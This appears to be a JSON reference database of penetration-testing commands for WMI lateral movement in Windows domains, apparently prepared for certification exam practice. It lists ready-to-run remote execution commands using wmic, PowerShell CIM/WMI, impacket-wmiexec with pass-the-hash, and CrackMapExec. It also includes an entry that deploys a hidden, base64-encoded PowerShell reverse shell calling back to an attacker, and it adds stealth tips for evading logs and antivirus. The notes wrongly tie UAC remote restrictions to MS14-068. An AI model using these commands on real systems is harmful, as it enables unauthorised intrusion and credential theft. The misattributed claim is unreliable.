{
  "commands": [
    {
      "id": "wmi-legacy-wmic",
      "name": "WMI - Legacy wmic Command (Deprecated)",
      "description": "Execute commands on remote Windows system using deprecated wmic utility (RPC port 135 + high port 19152-65535)",
      "command": "wmic /node:<TARGET> /user:<USER> /password:<PASS> process call create \"<COMMAND>\"",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP or hostname",
          "example": "10.10.10.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Domain user with local admin rights",
          "example": "corp\\jen",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "User password",
          "example": "SecureP@ss123!",
          "required": true
        },
        {
          "name": "<COMMAND>",
          "description": "Command to execute remotely (runs in Session 0)",
          "example": "calc",
          "required": true
        }
      ],
      "tags": [
        "PENTEST",
        "wmi",
        "wmic",
        "lateral-movement",
        "active-directory",
        "windows",
        "deprecated",
        "PRIORITY:HIGH"
      ],
      "prerequisites": [],
      "alternatives": [
        "wmi-invoke-method",
        "wmi-new-cimsession",
        "wmi-impacket-exec"
      ],
      "next_steps": [],
      "flag_explanations": {
        "/node:<TARGET>": "Specifies remote computer name or IP address",
        "/user:<USER>": "Domain\\username or username for authentication",
        "/password:<PASS>": "Password for authentication (cleartext)",
        "process call create": "WMI method to spawn new process remotely"
      },
      "success_indicators": [
        "ReturnValue = 0",
        "ProcessId = ",
        "Method execution successful"
      ],
      "failure_indicators": [
        "Access is denied",
        "RPC server is unavailable",
        "Invalid credentials"
      ],
      "troubleshooting": {
        "RPC server is unavailable": "Verify port 135 open: nmap -p 135 -Pn -sV <TARGET>",
        "Access is denied": "User needs local admin rights. Verify with: crackmapexec smb <TARGET> -u <USER> -p <PASS>",
        "Invalid credentials": "Test credentials first: crackmapexec smb <TARGET> -u <USER> -p <PASS>"
      },
      "notes": "REFERENCE MATERIAL - WMI LATERAL MOVEMENT:\nWHAT IS WMI:\nWindows Management Instrumentation is an object-oriented feature for task automation.\n\nHistorically abused for lateral movement via remote process creation using Win32_Process class.\n\nDEPRECATION STATUS:\nwmic.exe deprecated in Windows 10 21H1+ but STILL PRESENT in pentest environments (Windows Server 2019/2022).\n\nMust know for exam.\n\nSESSION 0 BEHAVIOR (CRITICAL):\nSystem processes and services always run in Session 0 as part of session isolation (introduced Windows Vista).\n\nBecause WMI Provider Host runs as a SYSTEM service, newly created processes through WMI spawn in Session 0.\n\nThis means:\n- GUI applications like calc.exe won't be visible to logged-in users\n- Verify execution via Task Manager or tasklist, NOT by looking for windows\n- Process runs with SYSTEM or user privileges depending on method\n\nPORT REQUIREMENTS:\n- TCP 135:\nRPC endpoint mapper (required for initial connection)\n- TCP 49152-65535:\nDynamic/ephemeral port range for session data (Windows Server 2008+)\n- Older systems use 1024-5000 range\n- Firewall must allow BOTH port 135 AND high-range ports\n\nUAC REMOTE RESTRICTIONS:\nDomain users bypass UAC remote restrictions (different than local accounts).\n\nThis is why jen (domain user + local admin) can execute without UAC prompts.\n\nMANUAL ALTERNATIVE:\nPowerShell Get-WmiObject -Class Win32_Process | Invoke-WmiMethod -Name Create -ArgumentList \"calc\" uses same WMI API.\n\nTIME ESTIMATE:\n2-3 minutes for command execution + verification.\n\nSTRATEGY:\nUse wmic for quick proof-of-concept, then upgrade to reverse shell via wmi-powershell-revshell.",
      "methodology_guidance": {
        "after_success": "wmi-powershell-revshell  # Upgrade to reverse shell for interactive access"
      },
      "filled_example": "wmic /node:10.10.10.73 /user:corp\\jen /password:SecureP@ss123! process call create \"calc\""
    },
    {
      "id": "wmi-invoke-method",
      "name": "WMI - PowerShell Invoke-WmiMethod",
      "description": "Execute commands remotely using PowerShell Invoke-WmiMethod with Win32_Process class",
      "command": "$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList '<COMMAND>' -ComputerName <TARGET> -Credential $credential",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP or hostname",
          "example": "10.10.10.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Domain\\username with admin rights",
          "example": "corp\\jen",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "User password",
          "example": "SecureP@ss123!",
          "required": true
        },
        {
          "name": "<COMMAND>",
          "description": "Command to execute (PowerShell one-liner or binary)",
          "example": "calc",
          "required": true
        }
      ],
      "tags": [
        "PENTEST",
        "wmi",
        "powershell",
        "lateral-movement",
        "active-directory",
        "windows",
        "invoke-wmimethod",
        "PRIORITY:HIGH"
      ],
      "prerequisites": [],
      "alternatives": [
        "wmi-new-cimsession",
        "wmi-impacket-exec",
        "wmi-legacy-wmic"
      ],
      "next_steps": [],
      "flag_explanations": {
        "-Class Win32_Process": "WMI class that manages processes",
        "-Name Create": "WMI method to spawn new process",
        "-ArgumentList": "Command string passed to Create method",
        "-ComputerName": "Remote target hostname or IP",
        "-Credential": "PSCredential object containing username/password"
      },
      "success_indicators": [
        "ReturnValue : 0",
        "ProcessId : ",
        "__GENUS : 2"
      ],
      "failure_indicators": [
        "Access is denied",
        "The RPC server is unavailable",
        "You cannot call a method on a null-valued expression"
      ],
      "troubleshooting": {
        "Access is denied": "Verify admin access: Get-WmiObject -Class Win32_ComputerSystem -ComputerName <TARGET> -Credential $credential",
        "RPC server unavailable": "Check firewall allows RPC: Test-NetConnection <TARGET> -Port 135",
        "Null-valued expression": "Ensure PSCredential object created successfully: $credential | Get-Member"
      },
      "notes": "METHODOLOGY - POWERSHELL WMI EXECUTION:\nWHY POWERSHELL OVER WMIC:\nModern alternative that provides better error handling, credential object support, and programmatic control.\n\nWmic is deprecated but PowerShell WMI cmdlets remain supported.\n\nCREDENTIAL OBJECT REQUIREMENT:\nMust create PSCredential object first:\n1.\n\nConvertTo-SecureString converts plaintext password to secure string\n2.\n\nNew-Object System.Management.Automation.PSCredential combines username + secure password\n3.\n\nThis object is reusable across multiple WMI calls\n\nPROTOCOL:\nUses DCOM (Distributed COM) over RPC:\n- Port 135 for endpoint mapper\n- Dynamic port 49152-65535 for data channel\n- Same underlying protocol as wmic utility\n\nSESSION 0 EXECUTION:\nProcesses spawn in Session 0 (system services context).\n\nVerify with tasklist, not GUI.\n\nUAC REMOTE RESTRICTIONS BYPASS:\nDomain users automatically bypass UAC remote restrictions per MS14-068.\n\nLocal accounts (except RID-500 Administrator) are restricted.\n\nMANUAL DISCOVERY METHOD:\n1.\n\nGet-WmiObject -Class Win32_Process -List (shows available methods)\n2.\n\nIdentify Create method signature\n3.\n\nInvoke-WmiMethod calls the Create method with ArgumentList\n\nTIME ESTIMATE:\n3-5 minutes (PSCredential creation + execution + verification).\n\nPRACTICAL TIP:\nSave PSCredential one-liner in notes for quick reuse during exam.",
      "methodology_guidance": {
        "after_success": "wmi-powershell-revshell  # Deploy reverse shell via WMI"
      },
      "filled_example": "$password = ConvertTo-SecureString 'SecureP@ss123!' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('corp\\jen', $password); Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'calc' -ComputerName 10.10.10.73 -Credential $credential"
    },
    {
      "id": "wmi-new-cimsession",
      "name": "WMI - PowerShell New-CimSession",
      "description": "Create CIM session over DCOM protocol and execute commands via Invoke-CimMethod",
      "command": "$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); $options = New-CimSessionOption -Protocol DCOM; $session = New-CimSession -ComputerName <TARGET> -Credential $credential -SessionOption $options; Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='<COMMAND>'}",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP or hostname",
          "example": "10.10.10.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Domain\\username",
          "example": "corp\\jen",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "SecureP@ss123!",
          "required": true
        },
        {
          "name": "<COMMAND>",
          "description": "Command to execute (full PowerShell command or binary path)",
          "example": "powershell -nop -w hidden -e <BASE64_PAYLOAD>",
          "required": true
        }
      ],
      "tags": [
        "PENTEST",
        "wmi",
        "cim",
        "powershell",
        "lateral-movement",
        "active-directory",
        "windows",
        "PRIORITY:HIGH"
      ],
      "prerequisites": [],
      "alternatives": [
        "wmi-invoke-method",
        "wmi-impacket-exec"
      ],
      "next_steps": [],
      "flag_explanations": {
        "New-CimSessionOption -Protocol DCOM": "Specifies DCOM as transport (legacy WMI protocol)",
        "New-CimSession": "Creates persistent session to remote WMI service",
        "-SessionOption": "Applies DCOM protocol configuration",
        "Invoke-CimMethod": "Executes WMI method on established session",
        "-ClassName Win32_Process": "Target WMI class for process creation",
        "-MethodName Create": "WMI method to spawn process",
        "-Arguments @{CommandLine=''}": "Hash table with command parameters"
      },
      "success_indicators": [
        "ProcessId",
        "ReturnValue : 0",
        "PSComputerName"
      ],
      "failure_indicators": [
        "Access denied",
        "WinRM cannot process the request",
        "The user name or password is incorrect"
      ],
      "troubleshooting": {
        "Access denied": "Test session creation: Test-WSMan -ComputerName <TARGET> -Credential $credential",
        "WinRM error": "This uses DCOM not WinRM - ensure port 135 open not 5985",
        "Session creation fails": "Verify credentials: Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName <TARGET> -Credential $credential"
      },
      "notes": "REFERENCE - CIM SESSION METHOD (RECOMMENDED POWERSHELL APPROACH):\nWHAT IS CIM:\nCommon Information Model - Microsoft's modern replacement for WMI cmdlets.\n\nIntroduced PowerShell 3.0+.\n\nWHY USE CIM OVER WMI CMDLETS:\n- Better error handling and structured output\n- Session reusability (create once, use many times)\n- Supports both DCOM and WS-MAN (WinRM) protocols\n- Future-proof (WMI cmdlets may be deprecated)\n\nDCOM PROTOCOL SELECTION:\nNew-CimSessionOption -Protocol DCOM forces legacy DCOM protocol instead of WinRM:\n- No WinRM service requirement (port 5985/5986)\n- Uses RPC port 135 + ephemeral ports 49152-65535\n- Compatible with older Windows systems\n- Bypasses WinRM configuration requirements (TrustedHosts, etc.)\n\nSESSION PERSISTENCE ADVANTAGE:\n1.\n\nCreate session once with New-CimSession (stores credentials)\n2.\n\nReuse $session variable for multiple Invoke-CimMethod calls\n3.\n\nNo re-authentication overhead\n4.\n\nFaster than Invoke-WmiMethod for multiple commands\n\nCOMMAND EXECUTION FLOW (FROM TRAINING MATERIAL):\n1.\n\nCreate PSCredential object (username + password)\n2.\n\nSet session options to DCOM protocol\n3.\n\nEstablish CimSession to target (authentication happens here)\n4.\n\nInvoke-CimMethod executes Win32_Process.Create remotely\n5.\n\nProcess spawns in Session 0 on target\n\nSTEALTH BENEFITS:\n- No WinRM event logs (uses DCOM not WS-MAN)\n- No service creation (unlike PSExec)\n- Native Windows feature (not suspicious)\n\nTIME ESTIMATE:\n2-4 minutes (session setup + command execution).\n\nSTRATEGY:\nUse this method when you need to run multiple commands on same target - session reuse saves time.",
      "methodology_guidance": {
        "after_success": "wmi-powershell-revshell  # Deploy encoded reverse shell payload"
      },
      "filled_example": "$password = ConvertTo-SecureString 'SecureP@ss123!' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('corp\\jen', $password); $options = New-CimSessionOption -Protocol DCOM; $session = New-CimSession -ComputerName 10.10.10.73 -Credential $credential -SessionOption $options; Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='powershell -nop -w hidden -e cG93ZXJzaGVsbCAtZSBKQUJqQUd3QWFRQmxBRzRBZEFBZ0FEMEFJQUJPQUdVQWR3QXRBRThBWWdCcUFHVUFZd0IwQUNBQVV3QjVBSE1BZEFCbEFHMEFMZ0JPQUdVQWRBQXVBRk1BYndCagpBR3NBWlFCMEFITUFMZ0JVQUVNQVVBQWJBR3dBYVFCbEFHNEFkQUFvQUNJQU1RQTVBR0lBTGdBeEFEWUFPQUF1QURFQU1RQTRB'}"
    },
    {
      "id": "wmi-impacket-exec",
      "name": "WMI - Impacket wmiexec (Kali)",
      "description": "Semi-interactive shell via WMI from Kali using impacket-wmiexec (executes commands through WMI without touching disk)",
      "command": "impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "Domain name",
          "example": "corp.com",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username with admin rights",
          "example": "jen",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password or NTLM hash with -hashes format",
          "example": "SecureP@ss123!",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "10.10.10.73",
          "required": true
        }
      ],
      "tags": [
        "PENTEST",
        "wmi",
        "impacket",
        "lateral-movement",
        "active-directory",
        "kali",
        "fileless",
        "PRIORITY:HIGH"
      ],
      "prerequisites": [],
      "alternatives": [
        "psexec-impacket-shell",
        "smbexec-impacket-fileless",
        "evil-winrm-shell"
      ],
      "next_steps": [],
      "flag_explanations": {
        "-hashes :NTLM": "Pass-the-hash with NTLM hash (no password needed)",
        "-shell-type powershell": "Use PowerShell instead of cmd.exe",
        "-codec utf-8": "Set character encoding for special characters",
        "-nooutput": "Don't retrieve command output (faster execution)"
      },
      "success_indicators": [
        "[*] SMBv3.0 dialect used",
        "[!] Launching semi-interactive shell",
        "C:\\>"
      ],
      "failure_indicators": [
        "[-] SMB SessionError",
        "STATUS_LOGON_FAILURE",
        "STATUS_ACCESS_DENIED"
      ],
      "troubleshooting": {
        "STATUS_LOGON_FAILURE": "Invalid credentials. Test with: crackmapexec smb <TARGET> -u <USER> -p <PASS>",
        "Connection timeout": "Firewall blocking SMB/RPC. Check ports: sudo nmap -p 135,445 -Pn -v <TARGET>",
        "STATUS_ACCESS_DENIED": "User not local admin. Verify with: crackmapexec smb <TARGET> -u <USER> -p <PASS> --local-auth"
      },
      "notes": "REFERENCE - IMPACKET WMIEXEC (PRIMARY KALI \u2192 WINDOWS LATERAL MOVEMENT):\nTRAINING MATERIAL EXAMPLE:\nFrom reference module, jen's account used to move from Kali to FILESERVER using NTLM hash:\n'impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@10.10.10.73'\n\nWHAT IS IMPACKET-WMIEXEC:\nPython-based semi-interactive shell that executes commands remotely via WMI without writing binaries to disk.\n\nPart of Impacket suite (installed by default on Kali).\n\nHOW IT WORKS (TECHNICAL BREAKDOWN):\n1.\n\nAuthenticates to target via SMB (port 445) using provided credentials\n2.\n\nCreates temporary administrative share (ADMIN$ or custom)\n3.\n\nExecutes commands via WMI Win32_Process.Create method (port 135 + ephemeral)\n4.\n\nRetrieves command output via SMB share\n5.\n\nDeletes output file from share\n6.\n\nRepeats for each command (semi-interactive loop)\n\nFILELESS EXECUTION:\n- No .exe binary dropped to disk\n- No service created (unlike PSExec)\n- All execution through native WMI Provider Host\n- Output temporarily written to share then deleted\n\nPROTOCOL REQUIREMENTS:\n- SMB (port 445):\nAuthentication + output retrieval\n- RPC (port 135):\nWMI communication\n- Ephemeral ports (49152-65535):\nSession data\n\nPASS-THE-HASH SUPPORT (CRITICAL FOR pentest):\nUse -hashes flag with format :NTLM (LM hash optional, usually blank):\n'impacket-wmiexec -hashes :NTLM_HASH user@target'\nNo password cracking needed - authenticate with hash directly.\n\nSTEALTH ADVANTAGES OVER PSEXEC:\n- No Event ID 7045 (service creation)\n- No psexesvc.exe binary on disk\n- Less antivirus detection\n- Native WMI process creation (appears legitimate)\n\nSEMI-INTERACTIVE SHELL BEHAVIOR:\n- Each command executes independently (not truly interactive)\n- Current directory NOT preserved between commands\n- Use full paths or 'cd /d C:\\Path && command' syntax\n- No tab completion\n\nTIME ESTIMATE:\n1-2 minutes for connection, <1 second per command execution.\n\nSTRATEGY:\nPreferred tool for lateral movement from Kali when you have credentials or NTLM hashes.\n\nMore reliable than evil-winrm in some environments.",
      "methodology_guidance": {
        "after_success": "mimikatz-sekurlsa-logonpasswords  # Dump credentials from LSASS ad-user-enumeration  # Enumerate domain users and groups"
      },
      "filled_example": "impacket-wmiexec corp.com/jen:SecureP@ss123!@10.10.10.73"
    },
    {
      "id": "wmi-cme-exec",
      "name": "WMI - CrackMapExec Command Execution",
      "description": "Execute single command on remote Windows via WMI using CrackMapExec",
      "command": "crackmapexec smb <TARGET> -u <USER> -p <PASS> -x '<COMMAND>'",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP or hostname",
          "example": "10.10.10.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "jen",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password or use -H for NTLM hash",
          "example": "SecureP@ss123!",
          "required": true
        },
        {
          "name": "<COMMAND>",
          "description": "Command to execute (cmd.exe syntax)",
          "example": "whoami",
          "required": true
        }
      ],
      "tags": [
        "PENTEST",
        "wmi",
        "crackmapexec",
        "cme",
        "lateral-movement",
        "active-directory",
        "kali",
        "PRIORITY:HIGH"
      ],
      "prerequisites": [],
      "alternatives": [
        "wmi-impacket-exec"
      ],
      "next_steps": [],
      "flag_explanations": {
        "-x '<COMMAND>'": "Execute cmd.exe command via WMI",
        "-X '<COMMAND>'": "Execute PowerShell command via WMI",
        "-H <NTLM>": "Use NTLM hash for pass-the-hash",
        "--exec-method wmiexec": "Explicitly specify WMI execution (default)",
        "-d <DOMAIN>": "Specify domain for authentication"
      },
      "success_indicators": [
        "[+] Executing command",
        "[*] Executed command via wmiexec",
        "Command output displayed"
      ],
      "failure_indicators": [
        "[-] Authentication failed",
        "[-] Connection error",
        "STATUS_ACCESS_DENIED"
      ],
      "troubleshooting": {
        "Authentication failed": "Try with domain: crackmapexec smb <TARGET> -d <DOMAIN> -u <USER> -p <PASS>",
        "Connection error": "Verify SMB open: crackmapexec smb <TARGET>",
        "No output shown": "Command may still execute - verify on target system"
      },
      "notes": "EDUCATIONAL CONTEXT:\nCrackMapExec wraps Impacket for rapid command execution.\n\nWHY USE CME:\nSupports subnet spraying (10.10.10.0/24), multiple hosts in single command.\n\nBEHIND THE SCENES:\nUses wmiexec execution method by default.\n\nCOMPARISON:\n-x for cmd.exe, -X for PowerShell, choose based on command type.\n\nTIME ESTIMATE:\n<1 minute for single command.\n\nPRACTICAL TIP:\nQuick way to test command execution across multiple hosts.",
      "methodology_guidance": {
        "after_success": "wmi-impacket-exec  # For interactive semi-shell access cme-smb-exec-powershell  # Use -X flag for PowerShell commands"
      },
      "filled_example": "crackmapexec smb 10.10.10.73 -u jen -p SecureP@ss123! -x 'whoami'"
    },
    {
      "id": "wmi-powershell-revshell",
      "name": "WMI - PowerShell Reverse Shell",
      "description": "Deploy base64-encoded PowerShell reverse shell via WMI for callback to attacker",
      "command": "$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); $options = New-CimSessionOption -Protocol DCOM; $session = New-CimSession -ComputerName <TARGET> -Credential $credential -SessionOption $options; $command = 'powershell -nop -w hidden -e <BASE64_PAYLOAD>'; Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=$command}",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "10.10.10.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Domain\\username",
          "example": "corp\\jen",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "SecureP@ss123!",
          "required": true
        },
        {
          "name": "<BASE64_PAYLOAD>",
          "description": "Base64-encoded PowerShell reverse shell (use base64-encode-powershell)",
          "example": "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AC...",
          "required": true
        }
      ],
      "tags": [
        "PENTEST",
        "wmi",
        "powershell",
        "reverse-shell",
        "lateral-movement",
        "active-directory",
        "windows",
        "PRIORITY:HIGH"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [],
      "flag_explanations": {
        "-nop": "No profile - don't load PowerShell profiles (faster/stealthy)",
        "-w hidden": "Hidden window - no visible PowerShell window",
        "-e <BASE64>": "Encoded command - executes base64 payload",
        "CommandLine=$command": "Full command string passed to WMI process creation"
      },
      "success_indicators": [
        "ProcessId : ",
        "ReturnValue : 0",
        "Netcat listener receives connection"
      ],
      "failure_indicators": [
        "Access is denied",
        "The system cannot find the file specified",
        "No connection received on listener"
      ],
      "troubleshooting": {
        "No connection received": "Verify LHOST/LPORT in encoded payload match listener",
        "Payload fails to execute": "Test decoding: [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64>'))",
        "Access denied": "Ensure user has admin rights: crackmapexec smb <TARGET> -u <USER> -p <PASS>",
        "Firewall blocking callback": "Test outbound connectivity from target first"
      },
      "notes": "EDUCATIONAL CONTEXT:\nCombines WMI lateral movement with PowerShell reverse shell for full interactive access.\n\nWHY BASE64:\nAvoids escaping issues with special characters in PowerShell one-liner.\n\nHOW TO GENERATE:\nUse base64-encode-powershell command or Python script from module.\n\nSTEALTH CONSIDERATIONS:\nRuns in Session 0 (system context), encoded to avoid AV signature detection.\n\nMANUAL DECODE:\n[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64>')).\n\nTIME ESTIMATE:\n3-5 minutes including payload generation.\n\nPRACTICAL TIP:\nPre-generate payloads before exam for various LHOST/LPORT combinations.",
      "methodology_guidance": {
        "after_success": "mimikatz-sekurlsa-logonpasswords  # Dump cached credentials ad-user-enumeration  # Enumerate domain accounts"
      },
      "filled_example": "$password = ConvertTo-SecureString 'SecureP@ss123!' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('corp\\jen', $password); $options = New-CimSessionOption -Protocol DCOM; $session = New-CimSession -ComputerName 10.10.10.73 -Credential $credential -SessionOption $options; $command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AC...'; Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=$command}"
    },
    {
      "id": "wmi-verify-enabled",
      "name": "WMI - Verify Service Enabled",
      "description": "Verify WMI service is running and accessible on remote target",
      "command": "Get-WmiObject -Class Win32_OperatingSystem -ComputerName <TARGET> -Credential (Get-Credential)",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP or hostname",
          "example": "10.10.10.73",
          "required": true
        }
      ],
      "tags": [
        "PENTEST",
        "wmi",
        "verification",
        "enumeration",
        "active-directory",
        "windows"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [],
      "flag_explanations": {
        "-Class Win32_OperatingSystem": "WMI class that exists on all Windows systems",
        "-ComputerName": "Target system to query",
        "-Credential": "Prompts for credentials interactively"
      },
      "success_indicators": [
        "SystemDirectory : C:\\Windows\\system32",
        "BuildNumber : ",
        "Caption : Microsoft Windows"
      ],
      "failure_indicators": [
        "The RPC server is unavailable",
        "Access is denied",
        "WMI: Not Found"
      ],
      "troubleshooting": {
        "RPC server unavailable": "Check port 135: Test-NetConnection <TARGET> -Port 135",
        "Access denied": "Test credentials: crackmapexec smb <TARGET> -u <USER> -p <PASS>",
        "Timeout": "Firewall likely blocking WMI/RPC ports"
      },
      "notes": "EDUCATIONAL CONTEXT:\nQuick test to verify WMI accessibility before attempting lateral movement.\n\nWHY WIN32_OPERATINGSYSTEM:\nLightweight query that exists on all Windows versions.\n\nALTERNATIVE TEST:\nwmic /node:<TARGET> /user:<USER> os get caption (from cmd.exe).\n\nFIREWALL REQUIREMENTS:\nNeeds RPC port 135 and high-range dynamic ports.\n\nTIME ESTIMATE:\n<1 minute for verification.",
      "methodology_guidance": {
        "after_success": "wmi-new-cimsession  # If successful, proceed with CIM session"
      },
      "filled_example": "Get-WmiObject -Class Win32_OperatingSystem -ComputerName 10.10.10.73 -Credential (Get-Credential)"
    },
    {
      "id": "wmi-invoke-wmimethod",
      "name": "WMI Invoke-WmiMethod Remote Command",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "command": "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList '<COMMAND>' -ComputerName <TARGET> -Credential $cred",
      "example": "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c whoami > C:\\temp\\out.txt' -ComputerName 10.10.10.73 -Credential $cred",
      "description": "Execute command on remote system via WMI Win32_Process.Create method from PowerShell",
      "tags": [
        "WMI",
        "LATERAL_MOVEMENT",
        "POWERSHELL"
      ],
      "variables": [
        {
          "name": "<COMMAND>",
          "description": "Command to execute remotely",
          "example": "cmd.exe /c whoami > C:\\temp\\out.txt",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP or hostname",
          "example": "10.10.10.73",
          "required": true
        }
      ],
      "flag_explanations": {
        "-Class Win32_Process": "WMI class for process management",
        "-Name Create": "Method to create new process",
        "-ArgumentList": "Command line to execute",
        "-ComputerName": "Target system",
        "-Credential": "PSCredential object ($cred = Get-Credential)"
      },
      "success_indicators": [
        "ReturnValue : 0",
        "ProcessId :"
      ],
      "failure_indicators": [
        "Access is denied",
        "RPC server is unavailable"
      ],
      "notes": "ReturnValue 0 = success. Output not returned - redirect to file and retrieve separately. Create cred: $cred = Get-Credential",
      "filled_example": "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c whoami > C:\\temp\\out.txt' -ComputerName 10.10.10.73 -Credential $cred"
    },
    {
      "id": "wmic-process-create",
      "name": "WMIC Remote Process Creation",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "command": "wmic /node:<TARGET> /user:<USER> /password:<PASS> process call create '<COMMAND>'",
      "example": "wmic /node:10.10.10.73 /user:Administrator /password:Password123! process call create 'cmd.exe /c whoami > C:\\temp\\out.txt'",
      "description": "Execute command on remote system via WMIC process creation from cmd.exe",
      "tags": [
        "WMI",
        "WMIC",
        "LATERAL_MOVEMENT"
      ],
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP or hostname",
          "example": "10.10.10.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username (DOMAIN\\user or user)",
          "example": "Administrator",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Password123!",
          "required": true
        },
        {
          "name": "<COMMAND>",
          "description": "Command to execute",
          "example": "cmd.exe /c whoami > C:\\temp\\out.txt",
          "required": true
        }
      ],
      "flag_explanations": {
        "/node": "Target computer",
        "/user": "Username for authentication",
        "/password": "Password for authentication",
        "process call create": "WMI method to create process"
      },
      "success_indicators": [
        "ReturnValue = 0",
        "ProcessId ="
      ],
      "failure_indicators": [
        "Access is denied",
        "Invalid credentials"
      ],
      "notes": "Output not returned - must redirect to file. WMIC deprecated in newer Windows but still works. Alternative: Invoke-WmiMethod in PowerShell.",
      "filled_example": "wmic /node:10.10.10.73 /user:Administrator /password:Password123! process call create 'cmd.exe /c whoami > C:\\temp\\out.txt'"
    }
  ]
}